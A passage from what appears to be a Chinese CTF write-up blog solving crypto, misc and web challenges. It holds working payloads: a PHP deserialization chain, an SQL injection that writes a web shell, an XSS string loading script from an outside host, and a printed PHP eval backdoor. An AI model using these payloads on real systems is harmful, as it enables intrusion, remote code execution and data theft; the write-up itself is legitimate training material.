class="line">完整flag: flag&#123;3bdb2424-591a-4a92-b587-74951c8ad192&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="不给你看喵"><a href="#不给你看喵" class="headerlink" title="不给你看喵"></a>不给你看喵</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># coding: utf-8</span><br><span class="line">import ast</span><br><span class="line">from itertools import product</span><br><span class="line">from pwn import remote, timeout</span><br><span class="line"></span><br><span class="line"># 参数（和你原题一致）</span><br><span class="line">p = 225791639467198034995070527100776477487</span><br><span class="line">g = 3</span><br><span class="line">h = 5</span><br><span class="line">n = 16</span><br><span class="line"></span><br><span class="line">def brute_force_x(a, t):</span><br><span class="line">    &quot;&quot;&quot;暴力枚举 0/1 向量 x，使 dot(a, x) == t。返回 tuple 或 None。&quot;&quot;&quot;</span><br><span class="line">    L = len(a)</span><br><span class="line">    for bits in product([0, 1], repeat=L):</span><br><span class="line">        # Python 的 sum 对大整数没有问题</span><br><span class="line">        dot = 0</span><br><span class="line">        for ai, xi in zip(a, bits):</span><br><span class="line">            if xi:</span><br><span class="line">                dot += ai</span><br><span class="line">        if dot == t:</span><br><span class="line">            return bits</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    host = &quot;8.147.130.32&quot;</span><br><span class="line">    port = 32772</span><br><span class="line">    conn = None</span><br><span class="line">    try:</span><br><span class="line">        conn = remote(host, port, timeout=10)</span><br><span class="line">        # 读取两行：第一行为 a，第二行为 t</span><br><span class="line">        raw_a = conn.recvline(timeout=5).decode().strip()</span><br><span class="line">        raw_t = conn.recvline(timeout=5).decode().strip()</span><br><span class="line"></span><br><span class="line">        a = ast.literal_eval(raw_a)</span><br><span class="line">        t = int(raw_t)</span><br><span class="line">        print(&quot;a =&quot;, a)</span><br><span class="line">        print(&quot;t =&quot;, t)</span><br><span class="line"></span><br><span class="line">        x = brute_force_x(a, t)</span><br><span class="line">        if x is None:</span><br><span class="line">            print(&quot;未找到满足条件的 x。&quot;)</span><br><span class="line">            return</span><br><span class="line">        print(&quot;Found x =&quot;, x)</span><br><span class="line"></span><br><span class="line">        # 构造 C 列表：对于每个比特，C_i = g^&#123;x_i&#125; * h mod p</span><br><span class="line">        # 由于 x_i ∈ &#123;0,1&#125;，等价于：x_i==0 -&gt; h, x_i==1 -&gt; g*h</span><br><span class="line">        C = []</span><br><span class="line">        for xi in x:</span><br><span class="line">            if xi == 0:</span><br><span class="line">                c_i = h % p</span><br><span class="line">            else:</span><br><span class="line">                c_i = (g * h) % p</span><br><span class="line">            C.append(c_i)</span><br><span class="line"></span><br><span class="line">        # 按照服务端提示逐个发送每个 bit 对应的 C[i]</span><br><span class="line">        for i in range(n):</span><br><span class="line">            # 等待服务端提示</span><br><span class="line">            conn.recvuntil(b&#x27;Every bit: &#x27;, timeout=5)</span><br><span class="line">            conn.sendline(str(C[i]).encode())</span><br><span class="line"></span><br><span class="line">        # 服务端发回 s 列表（应是一个 python list 字符串）</span><br><span class="line">        line_s = conn.recvline(timeout=5).decode().strip()</span><br><span class="line">        s_list = ast.literal_eval(line_s)</span><br><span class="line">        print(&quot;s =&quot;, s_list)</span><br><span class="line"></span><br><span class="line">        # 计算 S = sum(s_i * x_i)</span><br><span class="line">        S = sum(si * xi for si, xi in zip(s_list, x))</span><br><span class="line">        # 计算 M 和 R（按题目）</span><br><span class="line">        M = sum(s_list)</span><br><span class="line">        R = M + (p - 1)</span><br><span class="line"></span><br><span class="line">        # 发送 S 和 R（等待 &#x27;&gt;&#x27; 提示）</span><br><span class="line">        conn.recvuntil(b&#x27;&gt;&#x27;, timeout=5)</span><br><span class="line">        conn.sendline(str(S).encode())</span><br><span class="line">        conn.recvuntil(b&#x27;&gt;&#x27;, timeout=5)</span><br><span class="line">        conn.sendline(str(R).encode())</span><br><span class="line"></span><br><span class="line">        # 读取 flag</span><br><span class="line">        flag_line = conn.recvline(timeout=5).decode().strip()</span><br><span class="line">        print(&quot;Flag:&quot;, flag_line)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;发生异常：&quot;, repr(e))</span><br><span class="line">    finally:</span><br><span class="line">        if conn:</span><br><span class="line">            conn.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="混乱的网站"><a href="#混乱的网站" class="headerlink" title="混乱的网站"></a>混乱的网站</h3><p>网页会加载一个<code>function.js</code> 明显是某种加密流程 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    var Aij$cmYht1 = [&#x27;\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x75\x5a\x58\x64\x7a\x64\x47\x46\x79\x4c\x6d\x64\x68\x62\x57\x55\x76&#x27;, &#x27;\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x75\x5a\x58\x64\x7a\x64\x47\x46\x79\x4c\x6d\x64\x68\x62\x57\x56\x6b\x4c\x77\x3d\x3d&#x27;, &#x27;\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x75\x5a\x58\x64\x7a\x64\x47\x46\x79\x4c\x6d\x64\x68\x62\x57\x56\x7a\x4c\x77\x3d\x3d&#x27;, &#x27;\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x75\x5a\x58\x64\x7a\x64\x47\x46\x79\x4c\x6d\x64\x68\x62\x6d\x56\x7a\x4c\x77\x3d\x3d&#x27;, &#x27;\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x75\x5a\x58\x64\x7a\x64\x47\x46\x79\x4c\x6d\x64\x68\x62\x6d\x56\x7a\x4c\x77\x3d\x3d&#x27;];</span><br><span class="line">    var lot2 = [&#x27;\x5a\x6d\x46\x6a\x61\x31\x39\x6d\x62\x47\x46\x6e\x58\x77\x3d\x3d&#x27;, &#x27;\x5a\x6d\x78\x68\x5a\x31\x39\x6d\x59\x57\x4e\x72\x58\x77\x3d\x3d&#x27;, &#x27;\x61\x6e\x4e\x66\x64\x6d\x56\x79\x65\x56\x39\x6e\x62\x32\x39\x6b&#x27;, &#x27;\x61\x6e\x4e\x66\x5a\x6d\x4e\x31\x61\x77\x3d\x3d&#x27;, &#x27;\x61\x47\x39\x33\x58\x32\x46\x69\x62\x33\x56\x30\x58\x32\x70\x7a&#x27;];</span><br><span class="line">    function _pick(CjQmMUp3, K$kHfNWZ4) &#123;</span><br><span class="line">        return CjQmMUp3[(K$kHfNWZ4 * 7 + 3) % CjQmMUp3[&#x27;\x6c\x65\x6e\x67\x74\x68&#x27;]]</span><br><span class="line">    &#125;</span><br><span class="line">    function _b64decode(qhC5) &#123;</span><br><span class="line">        if (typeof atob === &#x27;\x66\x75\x6e\x63\x74\x69\x6f\x6e&#x27;) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                return atob(qhC5)</span><br><span class="line">            &#125; catch (e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        var aVeUV6 = &#x27;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d&#x27;;</span><br><span class="line">        var LegKEfpY7 = &#x27;&#x27;;</span><br><span class="line">        qhC5 = qhC5[&#x27;\x72\x65\x70\x6c\x61\x63\x65&#x27;](/[^A-Za-z0-9\+\/\=]/g, &#x27;&#x27;);</span><br><span class="line">        for (var snkimliGd8 = 0; snkimliGd8 &lt; qhC5[&#x27;\x6c\x65\x6e\x67\x74\x68&#x27;]; ) &#123;</span><br><span class="line">            var d9 = aVeUV6[&#x27;\x69\x6e\x64\x65\x78\x4f\x66&#x27;](qhC5[&#x27;\x63\x68\x61\x72\x41\x74&#x27;](snkimliGd8++));</span><br><span class="line">            var pTr10 = aVeUV6[&#x27;\x69\x6e\x64\x65\x78\x4f\x66&#x27;](qhC5[&#x27;\x63\x68\x61\x72\x41\x74&#x27;](snkimliGd8++));</span><br><span class="line">            var Ghn11 = aVeUV6[&#x27;\x69\x6e\x64\x65\x78\x4f\x66&#x27;](qhC5[&#x27;\x63\x68\x61\x72\x41\x74&#x27;](snkimliGd8++));</span><br><span class="line">            var IE12 = aVeUV6[&#x27;\x69\x6e\x64\x65\x78\x4f\x66&#x27;](qhC5[&#x27;\x63\x68\x61\x72\x41\x74&#x27;](snkimliGd8++));</span><br><span class="line">            var pvoGIOqE_13 = (d9 &lt;&lt; 2) | (pTr10 &gt;&gt; 4);</span><br><span class="line">            var YOM14 = ((pTr10 &amp; 15) &lt;&lt; 4) | (Ghn11 &gt;&gt; 2);</span><br><span class="line">            var _nvy15 = ((Ghn11 &amp; 3) &lt;&lt; 6) | IE12;</span><br><span class="line">            LegKEfpY7 += window[&quot;\x53\x74\x72\x69\x6e\x67&quot;][&#x27;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#x27;](pvoGIOqE_13);</span><br><span class="line">            if (Ghn11 !== 64)</span><br><span class="line">                LegKEfpY7 += window[&quot;\x53\x74\x72\x69\x6e\x67&quot;][&#x27;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#x27;](YOM14);</span><br><span class="line">            if (IE12 !== 64)</span><br><span class="line">                LegKEfpY7 += window[&quot;\x53\x74\x72\x69\x6e\x67&quot;][&#x27;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#x27;](_nvy15)</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            return decodeURIComponent(window[&quot;\x65\x73\x63\x61\x70\x65&quot;](LegKEfpY7))</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return LegKEfpY7</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    window[&#x27;\x5f\x72\x65\x74\x75\x72\x6e&#x27;] = function() &#123;</span><br><span class="line">        var uJSkGDiOs16 = _pick(Aij$cmYht1, 2);</span><br><span class="line">        var VPa17 = _pick(lot2, 2);</span><br><span class="line">        var qoLQjP18 = _b64decode(uJSkGDiOs16);</span><br><span class="line">        var KfPIM19 = _b64decode(VPa17);</span><br><span class="line">        window[&#x27;\x6c\x6f\x63\x61\x74\x69\x6f\x6e&#x27;][&#x27;\x68\x72\x65\x66&#x27;] = qoLQjP18;</span><br><span class="line">        try &#123;</span><br><span class="line">            window[&#x27;\x24&#x27;][&#x27;\x24&#x27;] = window[KfPIM19]</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            window[&#x27;\x24&#x27;][&#x27;\x24&#x27;] = undefined</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>你贴的这段 JavaScript 代码本质上是在做<strong>两件事</strong>：</p>
<ol>
<li><strong>从两个数组里选择 Base64 编码的字符串，然后解码</strong><ul>
<li><code>Aij$cmYht1</code> 和 <code>lot2</code> 都是一些 Base64 编码的字符串。</li>
<li><code>_pick(Aij$cmYht1, 2)</code> 会根据下标取出数组里的一个元素。</li>
<li><code>_b64decode</code> 会把 Base64 字符串解码成普通字符串。</li>
</ul>
</li>
<li><strong>改变页面行为</strong><ul>
<li><code>window.location.href = qoLQjP18;</code>：把浏览器重定向到解码出来的 URL。</li>
<li><code>window[&#39;$$&#39;] = window[KfPIM19]</code>：尝试把某个全局变量或函数赋值给 <code>$$</code>，如果失败就设为 <code>undefined</code>。</li>
</ul>
</li>
</ol>
<p>然后找到段php代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$file = &#x27;./backdoor.php&#x27;;</span><br><span class="line">$hack = &#x27;I hack you!&#x27;;</span><br><span class="line">/** $code = &quot;&lt;?php if(md5(\$_GET[&#x27;flag2&#x27;])==&#x27;87c298a56e0caa355872ab47db11e06c&#x27;)&#123;@eval(\$_POST[&#x27;cmd&#x27;]);&#125;?&gt;&quot;; **/</span><br><span class="line">while (1)&#123;</span><br><span class="line">	if (!file_exists($file)) &#123;</span><br><span class="line">		file_put_contents($file,$hack.$code);</span><br><span class="line">	&#125;</span><br><span class="line">	usleep(5000);</span><br><span class="line">	#unlink(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>md5查完后半段是ns2025 前半段有五个候选：</p>
<ul>
<li><code>fack_flag_</code></li>
<li><code>flag_fack_</code></li>
<li><code>js_very_good</code></li>
<li><code>js_fcuk</code></li>
<li><code>how_about_js</code></li>
</ul>
<p>组合形式都试一下就成了</p>
<h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="小羊走迷宫"><a href="#小羊走迷宫" class="headerlink" title="小羊走迷宫"></a>小羊走迷宫</h3><p>要解决的有 传参问题 和 反序列化问题<br>传参问题参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/shao65308/article/details/134312064">该文章</a> 成功解决了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&quot;ma_ze.path&quot;])&#123; </span><br><span class="line">unserialize(base64_decode($_GET[&quot;ma_ze.path&quot;])); </span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;这个变量名有点奇怪，要怎么传参呢？&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="65.png" alt="65"><br>也就是说为了传参至 <code>ma_ze.path</code> 我们需要构建的payload以<code>?ma[ze.path=</code>开头</p>
<p>随后是反序列化部分 利用了linux上.sh脚本生成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env bash</span><br><span class="line">set -euo pipefail</span><br><span class="line"></span><br><span class="line"># 生成器：在 Linux 上用 PHP CLI 生成序列化 payload（base64 + urlencoded）</span><br><span class="line">TMPPHP=&quot;$(mktemp /tmp/gen_payload.XXXX.php)&quot;</span><br><span class="line"></span><br><span class="line">cat &gt; &quot;$TMPPHP&quot; &lt;&lt;&#x27;PHP&#x27;</span><br><span class="line">&lt;?php</span><br><span class="line">class startPoint &#123; public $direction; &#125;</span><br><span class="line">class Treasure &#123; protected $door; protected $chest; &#125;</span><br><span class="line">class SaySomething &#123; public $sth; &#125;</span><br><span class="line">class endPoint &#123; private $path; &#125;</span><br><span class="line"></span><br><span class="line">/* 构造 endPoint 并设置私有属性 path */</span><br><span class="line">$end = new endPoint();</span><br><span class="line">$rc_end = new ReflectionClass(&#x27;endPoint&#x27;);</span><br><span class="line">$prop_path = $rc_end-&gt;getProperty(&#x27;path&#x27;);</span><br><span class="line">$prop_path-&gt;setAccessible(true);</span><br><span class="line">$prop_path-&gt;setValue($end, &#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">/* 构造 Treasure 并把 door/chest 指向 endPoint 实例（protected 属性通过反射写入） */</span><br><span class="line">$tre = new Treasure();</span><br><span class="line">$rc_tre = new ReflectionClass(&#x27;Treasure&#x27;);</span><br><span class="line">$p_door = $rc_tre-&gt;getProperty(&#x27;door&#x27;); $p_door-&gt;setAccessible(true); $p_door-&gt;setValue($tre, $end);</span><br><span class="line">$p_chest = $rc_tre-&gt;getProperty(&#x27;chest&#x27;); $p_chest-&gt;setAccessible(true); $p_chest-&gt;setValue($tre, $end);</span><br><span class="line"></span><br><span class="line">/* SaySomething 持有 Treasure，startPoint.direction 指向 SaySomething */</span><br><span class="line">$say = new SaySomething();</span><br><span class="line">$say-&gt;sth = $tre;</span><br><span class="line"></span><br><span class="line">$start = new startPoint();</span><br><span class="line">$start-&gt;direction = $say;</span><br><span class="line"></span><br><span class="line">/* 序列化并 base64 编码输出；同时输出 URL 编码版本 */</span><br><span class="line">$payload = base64_encode(serialize($start));</span><br><span class="line">echo $payload . PHP_EOL;</span><br><span class="line">echo urlencode($payload) . PHP_EOL;</span><br><span class="line">?&gt;</span><br><span class="line">PHP</span><br><span class="line"></span><br><span class="line"># 运行 PHP 生成 payload</span><br><span class="line">if ! command -v php &gt;/dev/null 2&gt;&amp;1; then</span><br><span class="line">    echo &quot;错误：未找到 php 命令。请先安装 PHP CLI（例如 apt install php-cli 或 yum install php-cli）。&quot; &gt;&amp;2</span><br><span class="line">    rm -f &quot;$TMPPHP&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;生成 payload 中... (临时文件: $TMPPHP)&quot;</span><br><span class="line">PAYLOAD_FULL=&quot;$(php &quot;$TMPPHP&quot; | sed -n &#x27;1p&#x27;)&quot;</span><br><span class="line">PAYLOAD_URLENC=&quot;$(php &quot;$TMPPHP&quot; | sed -n &#x27;2p&#x27;)&quot;</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">echo</span><br><span class="line">echo &quot;=== Base64 payload (完整，可直接作为 ma_ze.path 值) ===&quot;</span><br><span class="line">echo &quot;$PAYLOAD_FULL&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;=== URL-encoded payload (适合直接放在浏览器地址栏) ===&quot;</span><br><span class="line">echo &quot;$PAYLOAD_URLENC&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;=== 示例 curl（请替换 IP:PORT） ===&quot;</span><br><span class="line">echo &quot;curl \&quot;http://&lt;IP&gt;:&lt;PORT&gt;/?ma_ze.path=$PAYLOAD_URLENC\&quot;&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;临时 PHP 文件：$TMPPHP （运行结束后脚本会删除它）&quot;</span><br><span class="line"></span><br><span class="line"># 清理临时文件</span><br><span class="line">rm -f &quot;$TMPPHP&quot;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="66.png" alt="66"></p>
<p>出来的文字段base64解码就行了</p>
<h3 id="武功秘籍"><a href="#武功秘籍" class="headerlink" title="武功秘籍"></a>武功秘籍</h3><p>题目提示与CVE漏洞有关<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="67.png" alt="67"><br>网站那么大一个dcrcms 后台也是弱密码(admin&#x2F;admin) 于是拿dcrcms为关键词搜索漏洞<br>发现了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/127238674">dcrcms文件上传(cnvd-2020-27175)</a><br>全程复现该漏洞 随后利用蚁剑链接 在&#x2F;flag下获取flag值即可</p>
<h3 id="sqlupload"><a href="#sqlupload" class="headerlink" title="sqlupload"></a>sqlupload</h3><p>看了参考文档 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在一般的 SQLi 题目中，可能会出现 flag 不在数据库中的情况，这时你需要通过利用 SQL 中特殊的函数来进行注入。</span><br><span class="line"></span><br><span class="line">在羊城杯 2025 中，有一题 Ezsignin，该题利用 SQLite 中的特性，注入恶意语句到数据库中，然后使用 ATTACH 语句将恶意代码注入到 /app/views/upload.ejs 来进行数据库层面之外的攻击（这里指 SSTI）。更多细节可以参见 SQLite Injection.</span><br><span class="line"></span><br><span class="line">本题具有类似的原理，但是实践方式更简单，你需要在特定的位置注入你的恶意代码，然后想办法将其保存在可被执行的位置。</span><br><span class="line"></span><br><span class="line">本题根目录下的 flag 文件被保护了起来，你需要通过执行 readflag 来获得 flag.</span><br></pre></td></tr></table></figure>

<p>本题的区别在于使用了mysql而不是SQLlite 因此代码逻辑也有相应变化</p>
<p>给的文件夹中 src给了三个页面的具体代码 逐一分析 发现getfilelist.php中存在order参数可进行sql注入<br>由于注入点是order by 我们利用<code>id结合into outfile</code>的方式来新建文件 apache的默认目录为<code>/var/www/html</code><br>那就最终组建payload来创建一个<code>shell.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/getFileList.php?order=id+into+outfile+&#x27;/var/www/html/shelll.php&#x27;</span><br><span class="line">//后半部分试过空格 不成 用了burpsuite转码 </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="68.png" alt="68"></p>
<p>这里会报错 但访问根目录&#x2F;shell.php有正常的页面 说明创建成功了<br>且在上传文件的情况下会依次显示每个文件的 <code>文件序号 文件名 上传时间</code> 并且以php方式呈现<br>那就有思路了 把文件名改成相应的php代码并闭合 再创建一个新页面 是不是就能在新页面中注入对应代码呢<br>先测试了<code>&lt;?php phpinfo();?&gt;</code> 成功运行</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="69.png" alt="69"><br>flag需要运行<strong>readFlag</strong>才能获取 于是利用system函数传参运行<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="70.png" alt="70"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="71.png" alt="71"></p>
<h3 id="小e的留言板"><a href="#小e的留言板" class="headerlink" title="小e的留言板"></a>小e的留言板</h3><p>指导文件里说是XSS漏洞 分析WAF后通过双写和双引号闭合引发flag 我这里利用了TLXSS平台自带的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa&quot; oonnfofocuscus=eval(atob(&#x27;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPScvL3hzLnBlL2tLbCc7&#x27;)) autofofocuscus &quot;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="72.png" alt="72"></p>
<h3 id="ssti在哪里？"><a href="#ssti在哪里？" class="headerlink" title="ssti在哪里？"></a>ssti在哪里？</h3><p>利用gopher协议的ssrf+ssti漏洞的结合 组成payload 上传后获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopher://host:port/_&lt;urlencoded-data&gt; 这个格式会把 _&lt;urlencoded-data&gt; 解码后作为原始 TCP 数据直接发送到目标 host:port。</span><br><span class="line"></span><br><span class="line">也就是说它不是标准的 HTTP GET，而是把你自己构造的整段 HTTP 请求字节流直接写到目标端口上（相当于直接在 TCP 上发你想要的 HTTP 报文）。</span><br><span class="line"></span><br><span class="line">这是 SSRF 利用的常见技巧：当目标的远程请求接口（这里是 PHP 的 curl）只允许你传入一个 URL（无法直接指定 POST 或 body）时，使用 gopher 协议可以把任意原始请求（包括 POST + body）写到内网服务上。</span><br></pre></td></tr></table></figure>

<p>最终的payload如下</p>
